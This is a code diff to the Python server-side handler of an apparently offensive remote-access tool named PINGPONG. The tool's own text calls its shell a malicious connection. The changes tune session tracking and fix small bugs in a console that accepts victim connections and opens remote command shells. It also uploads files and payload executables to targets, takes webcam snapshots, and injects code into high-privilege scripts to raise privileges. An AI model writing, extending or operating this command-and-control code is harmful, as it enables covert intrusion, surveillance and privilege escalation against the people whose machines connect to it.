@@ -29,8 +29,11 @@ def stop_thread(thread):
 #函数中printf参数决定时候进行不必要的输出
 def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True):
     global g_is_auto, connect_pool, t
+    connect_pool = main.get_value('connect_pool')
+    if connect_pool == None:
+        connect_pool = []
+        main.set_config('connect_pool', connect_pool)
     g_is_auto = is_auto
-    connect_pool = []
     config_list = ["listen_Default_ip", "listen_Default_port", "Autocommand"]
     handler_d = main.get_value('handler')
     load_config(config_list, handler_d)
@@ -72,12 +75,13 @@ def startserver(printf, ip='127.0.0.1', port='624', is_input=False, is_auto=True
             main.main()
         _ip = addr[0]
         _port = addr[1]
+        connect_pool.append([conn, ip, port, _ip, _port, 'PINGPONG session'])
+        id = len(connect_pool)
         # PINGPONG_script.upload.Upload(_ip, "./payload/upload_payload/PINGPONG_payload.exe", "D:/TEMP", False, False, conn, "")
         if printf:
-            main.print_normal('handler>[*]PINGPONG session Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
+            main.print_normal(f'handler>[*]PINGPONG session {id} Created: ' + ip + ":" + str(port) + " >>> " + _ip + ":" + str(_port))
         # t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, AUTORUNSCRIPT, open_ac))
         # t.start()
-        connect_pool.append([conn, ip, port, _ip, _port])
         main.set_config('connect_pool', connect_pool)
         
         t = threading.Thread(target=PINGPONG_shell, args=(conn, ip, port, _ip, str(_port), True, Autocommand))
@@ -118,8 +122,9 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
             upload : upload your file
             cam_shot : take shot
             priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
-            main.print_warn("PINGPONG>[!]type 'show usage' to print out all the activate usage")
+            main.print_warn("PINGPONG>[!]type 'show_usage' to print out all the activate usage")
         elif command == 'bg' or command == 'BG':
+            main.print_normal('backgrounding session......')
             if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
                 main.main()
         elif command == "cam_shot" or command == "CAM_SHOT":
@@ -138,7 +143,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
             main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
             main.print_normal("handler>[*]Back to main console......")
             connect_pool = main.get_value('connect_pool')
-            connect_pool.remove([conn, my_ip, my_port, ip, int(port)])
+            connect_pool.remove([conn, my_ip, my_port, ip, int(port), 'PINGPONG session'])
             main.set_config('connect_pool', connect_pool)
             conn.close()
             main.main()
@@ -157,12 +162,11 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
                 conn.send(b'OK')
                 i = 0
                 usage_list = []
-                while i <= int(amount_of_usage.decode('utf8')):
+                while i < int(amount_of_usage.decode('utf8')):
                     usage = conn.recv(1024)
                     usage_list.append(usage.decode('utf8'))
                     conn.send(b'OK')
                     i += 1
-                usage_list.pop()
                 main.print_normal(f'''PINGPONG>[*]usage : {usage_list}''')
 
         elif command == "cmd" or command == "CMD":
@@ -172,7 +176,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
                 cmd_port = random.randint(5000, 8000)
                 conn.send(bytes(str(cmd_port), "utf8"))
                 conn.recv(1024)
-                PINGPONG_script.cmdshell.start(my_ip, cmd_port, conn, my_port, ip, port)
+                PINGPONG_script.cmdshell.start(my_ip, cmd_port, conn, my_port)
         elif command == "upload" or command == "UPLOAD":
             import PINGPONG_script.upload
             if PINGPONG_script.addsend.App_send('UPLOAD_APP', False, conn):
@@ -180,7 +184,7 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
                 to_dir = input("PINGPONG>[*]Please input the location of the file where you uploaded>")
                 PINGPONG_script.upload.Upload(ip, file_dir, to_dir, True, True, conn, PINGPONG_script.addsend)
         elif command == "info" or command == "INFO":
-            main.print_normal("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + port)
+            main.print_normal("PINGPONG>[*]Connection: " + my_ip + ":" + str(my_port) + " >>> " + ip + ":" + str(port))
         elif command == "ping" or command == "PING":
             if PINGPONG_script.addsend.App_send("CHECK_APP", False, conn):
                 main.print_normal("PINGPONG>[*]PONG")
